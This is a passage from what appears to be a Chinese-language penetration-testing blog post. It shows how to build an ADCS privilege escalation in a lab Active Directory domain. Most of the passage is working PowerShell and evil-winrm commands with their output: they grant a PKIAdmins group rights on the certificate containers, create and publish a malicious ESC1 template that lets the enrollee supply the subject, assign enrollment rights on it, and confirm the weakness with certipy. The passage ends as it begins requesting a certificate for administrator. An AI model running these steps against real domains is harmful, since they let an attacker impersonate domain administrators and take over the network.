+</span></span><span style="display:flex;"><span>pKIExtendedKeyUsage	<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;1.3.6.1.5.5.7.3.2&#34;</span><span style="color:#f92672">]</span>	<span style="color:#75715e">#扩展密钥用途，重复指定客户端身份认证</span>
+</span></span><span style="display:flex;"><span>msPKI-Enrollment-Flag	0	<span style="color:#75715e">#注册标志（0 = 不自动注册）</span>
+</span></span><span style="display:flex;"><span>msPKI-RA-Signature	0	<span style="color:#75715e">#RA 签名属性，0 表示默认</span>
+</span></span><span style="display:flex;"><span>msPKI-Template-Minor-Revision	4	<span style="color:#75715e">#小版本号，用于模板升级</span>
+</span></span><span style="display:flex;"><span>msPKI-Template-Schema-Version	2	<span style="color:#75715e">#模板 schema 版本（AD 内部版本控制）</span>
+</span></span></code></pre></div><h3 id="pkiadmin组权限构筑">pkiadmin组权限构筑
+</h3><p>现在为了发布这个模板让其能正常使用，我们需要进行如下三步</p>
+<ol>
+<li>为这个模板创建对应的OID对象</li>
+<li>创建证书模板（我们已经完成了这步）</li>
+<li>发布模板到ca</li>
+</ol>
+<p>为了完成前两种种操作，pkiadmin组分别需要对OID Container和Certificate Templates这两个容器有 CreateChild, WriteProperty权限，这表示了pkiadmin可以对证书模板以及oid设置有子类创建以及写入的权限，用于导入模板的使用</p>
+<p>而一旦模板导入，我们需要其对ca的WriteProperty权限用于注册证书（注意这里WriteProperty权限即可，完全掌控就可以打黄金证书了，但是没有权限的话在后续会提示权限不足，我已经失败过很多次了）</p>
+<p>我在一个配置好了域控及证书服务的环境当中创建了一个空白的pkiadmin组，并用了如下脚本分配了以上我提到的权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 获取配置命名上下文</span>
+</span></span><span style="display:flex;"><span>$ConfigNC <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Get-ADRootDSE<span style="color:#f92672">)</span>.configurationNamingContext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 容器路径</span>
+</span></span><span style="display:flex;"><span>$TemplateCN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CN=Certificate Templates,CN=Public Key Services,CN=Services,</span>$ConfigNC<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$OIDCN      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CN=OID,CN=Public Key Services,CN=Services,</span>$ConfigNC<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$EnrollmentPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CN=Enrollment Services,CN=Public Key Services,CN=Services,</span>$ConfigNC<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取 CA</span>
+</span></span><span style="display:flex;"><span>$CAs <span style="color:#f92672">=</span> Get-ADObject -SearchBase $EnrollmentPath -SearchScope OneLevel -Filter *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取 PKIAdmins SID</span>
+</span></span><span style="display:flex;"><span>$account <span style="color:#f92672">=</span> New-Object System.Security.Principal.NTAccount<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WACKADCS\PKIAdmins&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$sid     <span style="color:#f92672">=</span> $account.Translate<span style="color:#f92672">([</span>System.Security.Principal.SecurityIdentifier<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ACE 构造函数（6参数）</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Add-PKIAdminACE<span style="color:#f92672">(</span>$path, $rights<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    $acl <span style="color:#f92672">=</span> Get-ACL <span style="color:#e6db74">&#34;AD:</span>$path<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    $ace <span style="color:#f92672">=</span> New-Object System.DirectoryServices.ActiveDirectoryAccessRule<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>        $sid,
+</span></span><span style="display:flex;"><span>        $rights,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>System.Security.AccessControl.AccessControlType<span style="color:#f92672">]</span>::Allow,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>GUID<span style="color:#f92672">]</span>::Empty,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>System.DirectoryServices.ActiveDirectorySecurityInheritance<span style="color:#f92672">]</span>::None,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>GUID<span style="color:#f92672">]</span>::Empty
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    $acl.AddAccessRule<span style="color:#f92672">(</span>$ace<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Set-ACL <span style="color:#e6db74">&#34;AD:</span>$path<span style="color:#e6db74">&#34;</span> $acl
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  Certificate Templates 容器权限</span>
+</span></span><span style="display:flex;"><span>Add-PKIAdminACE -path $TemplateCN -rights <span style="color:#f92672">([</span>System.DirectoryServices.ActiveDirectoryRights<span style="color:#f92672">]</span>::CreateChild -bor <span style="color:#f92672">[</span>System.DirectoryServices.ActiveDirectoryRights<span style="color:#f92672">]</span>::WriteProperty<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OID 容器权限</span>
+</span></span><span style="display:flex;"><span>Add-PKIAdminACE -path $OIDCN -rights <span style="color:#f92672">([</span>System.DirectoryServices.ActiveDirectoryRights<span style="color:#f92672">]</span>::CreateChild -bor <span style="color:#f92672">[</span>System.DirectoryServices.ActiveDirectoryRights<span style="color:#f92672">]</span>::WriteProperty<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CA 对象权限（允许写入 certificateTemplates 属性）</span>
+</span></span><span style="display:flex;"><span>foreach <span style="color:#f92672">(</span>$CA in $CAs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    $CAPath <span style="color:#f92672">=</span> $CA.DistinguishedName
+</span></span><span style="display:flex;"><span>    Add-PKIAdminACE -path $CAPath -rights <span style="color:#f92672">([</span>System.DirectoryServices.ActiveDirectoryRights<span style="color:#f92672">]</span>::WriteProperty<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 可选：检查权限</span>
+</span></span><span style="display:flex;"><span>foreach <span style="color:#f92672">(</span>$CA in $CAs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    Write-Host <span style="color:#e6db74">&#34;==== </span><span style="color:#66d9ef">$(</span>$CA.Name<span style="color:#66d9ef">)</span><span style="color:#e6db74"> ====&#34;</span>
+</span></span><span style="display:flex;"><span>    Get-ACL <span style="color:#e6db74">&#34;AD:</span><span style="color:#66d9ef">$(</span>$CA.DistinguishedName<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> |
+</span></span><span style="display:flex;"><span>        Select-Object -ExpandProperty Access |
+</span></span><span style="display:flex;"><span>        Where-Object <span style="color:#f92672">{</span>$_.IdentityReference -like <span style="color:#e6db74">&#34;*PKIAdmins*&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 可选：检查模板和 OID 容器</span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;=== Certificate Templates ===&#34;</span>
+</span></span><span style="display:flex;"><span>Get-ACL <span style="color:#e6db74">&#34;AD:</span>$TemplateCN<span style="color:#e6db74">&#34;</span> | Select-Object -ExpandProperty Access | Where-Object <span style="color:#f92672">{</span>$_.IdentityReference -like <span style="color:#e6db74">&#34;*PKIAdmins*&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;=== OID Container ===&#34;</span>
+</span></span><span style="display:flex;"><span>Get-ACL <span style="color:#e6db74">&#34;AD:</span>$OIDCN<span style="color:#e6db74">&#34;</span> | Select-Object -ExpandProperty Access | Where-Object <span style="color:#f92672">{</span>$_.IdentityReference -like <span style="color:#e6db74">&#34;*PKIAdmins*&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>利用域管权限执行后可以看到效果正常，一个可以用于利用，常见的pkiadmin组就被创建好了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; powershell .<span style="color:#ae81ff">\m</span>ake_pkiadmins.ps1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span> wackadcs-DC-CA <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ActiveDirectoryRights : WriteProperty
+</span></span><span style="display:flex;"><span>InheritanceType       : None
+</span></span><span style="display:flex;"><span>ObjectType            : 00000000-0000-0000-0000-000000000000
+</span></span><span style="display:flex;"><span>InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+</span></span><span style="display:flex;"><span>ObjectFlags           : None
+</span></span><span style="display:flex;"><span>AccessControlType     : Allow
+</span></span><span style="display:flex;"><span>IdentityReference     : WACKADCS<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>IsInherited           : False
+</span></span><span style="display:flex;"><span>InheritanceFlags      : None
+</span></span><span style="display:flex;"><span>PropagationFlags      : None
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> Certificate Templates <span style="color:#f92672">===</span>
+</span></span><span style="display:flex;"><span>ActiveDirectoryRights : CreateChild, WriteProperty
+</span></span><span style="display:flex;"><span>InheritanceType       : None
+</span></span><span style="display:flex;"><span>ObjectType            : 00000000-0000-0000-0000-000000000000
+</span></span><span style="display:flex;"><span>InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+</span></span><span style="display:flex;"><span>ObjectFlags           : None
+</span></span><span style="display:flex;"><span>AccessControlType     : Allow
+</span></span><span style="display:flex;"><span>IdentityReference     : WACKADCS<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>IsInherited           : False
+</span></span><span style="display:flex;"><span>InheritanceFlags      : None
+</span></span><span style="display:flex;"><span>PropagationFlags      : None
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> OID Container <span style="color:#f92672">===</span>
+</span></span><span style="display:flex;"><span>ActiveDirectoryRights : CreateChild, WriteProperty
+</span></span><span style="display:flex;"><span>InheritanceType       : None
+</span></span><span style="display:flex;"><span>ObjectType            : 00000000-0000-0000-0000-000000000000
+</span></span><span style="display:flex;"><span>InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+</span></span><span style="display:flex;"><span>ObjectFlags           : None
+</span></span><span style="display:flex;"><span>AccessControlType     : Allow
+</span></span><span style="display:flex;"><span>IdentityReference     : WACKADCS<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>IsInherited           : False
+</span></span><span style="display:flex;"><span>InheritanceFlags      : None
+</span></span><span style="display:flex;"><span>PropagationFlags      : None
+</span></span></code></pre></div><p>接下来我创建了一个testuser用于测试远程攻击，将其添加入pkiadmin以及远程管理组</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; $password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;wacky123!@#&#34;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; New-ADUser -Name $userName <span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;            -SamAccountName $userName <span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;            -AccountPassword $password <span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;            -Enabled $true <span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;            -Path $ou
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;PKIAdmins&#34;</span> -Members $userName
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> -Members $userName
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Remote Management Users&#34;</span> -Members $userName
+</span></span></code></pre></div><h3 id="注册恶意模板">注册恶意模板
+</h3><p>当我们利用testuser权限winrm登陆机器的时候，就可以一步一步注册模板了</p>
+<p>首先创建OID对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; $OIDProps <span style="color:#f92672">=</span> @<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;DisplayName&#39;</span>             <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ESC1&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Cert-Template-OID&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flags&#39;</span>                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; New-ADObject -Path $OIDPath -Name <span style="color:#e6db74">&#39;ESC1&#39;</span> -Type <span style="color:#e6db74">&#39;msPKI-Enterprise-Oid&#39;</span> -OtherAttributes $OIDProps
+</span></span></code></pre></div><p>之后创建证书模板对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; $TemplatePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CN=Certificate Templates,CN=Public Key Services,CN=Services,</span>$ConfigNC<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; $TemplateProps <span style="color:#f92672">=</span> @<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;displayName&#39;</span>                   <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ESC1&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Cert-Template-OID&#39;</span>       <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flags&#39;</span>                         <span style="color:#f92672">=</span> <span style="color:#ae81ff">131616</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;revision&#39;</span>                      <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Certificate-Application-Policy&#39;</span> <span style="color:#f92672">=</span> @<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1.3.6.1.5.5.7.3.2&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Certificate-Name-Flag&#39;</span>   <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Enrollment-Flag&#39;</span>         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Minimal-Key-Size&#39;</span>        <span style="color:#f92672">=</span> <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Private-Key-Flag&#39;</span>        <span style="color:#f92672">=</span> <span style="color:#ae81ff">16842752</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-RA-Signature&#39;</span>            <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Template-Minor-Revision&#39;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;msPKI-Template-Schema-Version&#39;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKICriticalExtensions&#39;</span>          <span style="color:#f92672">=</span> @<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;2.5.29.15&#39;</span>,<span style="color:#e6db74">&#39;2.5.29.7&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIDefaultCSPs&#39;</span>                 <span style="color:#f92672">=</span> @<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;3,Microsoft Base DSS Cryptographic Provider&#39;</span>,
+</span></span><span style="display:flex;"><span>                                          <span style="color:#e6db74">&#39;2,Microsoft Base Cryptographic Provider v1.0&#39;</span>,
+</span></span><span style="display:flex;"><span>                                          <span style="color:#e6db74">&#39;1,Microsoft Enhanced Cryptographic Provider v1.0&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIDefaultKeySpec&#39;</span>              <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIExpirationPeriod&#39;</span>            <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>byte<span style="color:#f92672">[]](</span>0,64,57,135,46,225,254,255<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIExtendedKeyUsage&#39;</span>            <span style="color:#f92672">=</span> @<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1.3.6.1.5.5.7.3.2&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIKeyUsage&#39;</span>                    <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>byte<span style="color:#f92672">[]](</span>128,0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIMaxIssuingDepth&#39;</span>             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;pKIOverlapPeriod&#39;</span>               <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>byte<span style="color:#f92672">[]](</span>0,128,166,10,255,222,255,255<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; New-ADObject -Path $TemplatePath -Name <span style="color:#e6db74">&#39;ESC1&#39;</span> -Type <span style="color:#e6db74">&#39;pKICertificateTemplate&#39;</span> -OtherAttributes $Template
+</span></span><span style="display:flex;"><span>Props
+</span></span></code></pre></div><p>在ca中注册模板</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; $CAs <span style="color:#f92672">=</span> Get-ADObject -SearchBase $EnrollmentPath -SearchScope OneLevel -Filter *
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span><span style="display:flex;"><span>foreach <span style="color:#f92672">(</span>$CA in $CAs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    Set-ADObject -Identity $CA.DistinguishedName -Add @<span style="color:#f92672">{</span>certificateTemplates<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ESC1&#39;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>当注册完毕后，模板只是注册在了ca当中，但是没有人能利用它，我们需要在其中属性中写入能请求的组，作为它的onwer，我们是有权限的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>$TemplateDN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CN=ESC1,CN=Certificate Templates,CN=Public Key Services,CN=Services,</span>$ConfigNC<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$acl <span style="color:#f92672">=</span> Get-ACL <span style="color:#e6db74">&#34;AD:</span>$TemplateDN<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$rule <span style="color:#f92672">=</span> New-Object System.DirectoryServices.ActiveDirectoryAccessRule<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>New-Object System.Security.Principal.NTAccount<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;PKIadmins&#34;</span><span style="color:#f92672">))</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ExtendedRight&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>GUID<span style="color:#f92672">]</span><span style="color:#e6db74">&#34;00000000-0000-0000-0000-000000000000&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$acl.AddAccessRule<span style="color:#f92672">(</span>$rule<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Set-ACL -Path <span style="color:#e6db74">&#34;AD:</span>$TemplateDN<span style="color:#e6db74">&#34;</span> -AclObject $acl
+</span></span></code></pre></div><p>没有报错则是正常的，我们尝试使用certipy远程查找一下可利用模板</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/adcs-test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">35</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span>...........
+</span></span><span style="display:flex;"><span>    Template Name                       : ESC1
+</span></span><span style="display:flex;"><span>    Display Name                        : ESC1
+</span></span><span style="display:flex;"><span>    Certificate Authorities             : wackadcs-DC-CA
+</span></span><span style="display:flex;"><span>    Enabled                             : True
+</span></span><span style="display:flex;"><span>    Client Authentication               : True
+</span></span><span style="display:flex;"><span>    Enrollment Agent                    : False
+</span></span><span style="display:flex;"><span>    Any Purpose                         : False
+</span></span><span style="display:flex;"><span>    Enrollee Supplies Subject           : True
+</span></span><span style="display:flex;"><span>    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span style="display:flex;"><span>    Extended Key Usage                  : Client Authentication
+</span></span><span style="display:flex;"><span>    Requires Manager Approval           : False
+</span></span><span style="display:flex;"><span>    Requires Key Archival               : False
+</span></span><span style="display:flex;"><span>    Authorized Signatures Required      : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Schema Version                      : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    Validity Period                     : <span style="color:#ae81ff">1</span> year
+</span></span><span style="display:flex;"><span>    Renewal Period                      : <span style="color:#ae81ff">6</span> weeks
+</span></span><span style="display:flex;"><span>    Minimum RSA Key Length              : <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>    Template Created                    : 2025-08-29T10:18:30+00:00
+</span></span><span style="display:flex;"><span>    Template Last Modified              : 2025-08-29T10:18:30+00:00
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Enrollment Permissions
+</span></span><span style="display:flex;"><span>        Enrollment Rights               : WACKADCS.COM<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>      Object Control Permissions
+</span></span><span style="display:flex;"><span>        Owner                           : WACKADCS.COM<span style="color:#ae81ff">\t</span>estuser
+</span></span><span style="display:flex;"><span>        Full Control Principals         : WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Owner Principals          : WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Dacl Principals           : WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Enrollable Principals      : WACKADCS.COM<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User ACL Principals             : WACKADCS.COM<span style="color:#ae81ff">\t</span>estuser
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC1                              : Enrollee supplies subject and template allows client authentication.
+</span></span><span style="display:flex;"><span>      ESC4                              : Template is owned by user.
+</span></span></code></pre></div><p>可以看到Enrollment Rights: WACKADCS.COM\PKIAdmins这则允许我们当前组去以任意身份请求证书,我们可以利用Certify和Rubeus尝试利用</p>
+<p>先以administrator身份请求证书</p>
